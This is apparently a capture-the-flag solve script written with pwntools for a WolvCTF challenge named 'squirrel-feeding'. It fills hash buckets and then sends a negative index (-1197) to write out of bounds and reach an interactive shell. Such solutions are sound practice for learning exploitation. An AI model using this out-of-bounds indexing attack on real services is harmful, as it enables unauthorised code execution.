#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./challenge')
# p=remote("squirrel-feeding.wolvctf.io",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)


for i in range(4):
    sla("> ", "1")
    sla(": ", "1"+"2"*i) # (49 + 50*i) % 10 = 9
    sla(": ", "1")

# gdb.attach(p)

sla("> ", "1")
sla(": ", "1"+"2222")
sla(": ", "-1197") # 0x4ae-1


p.interactive()
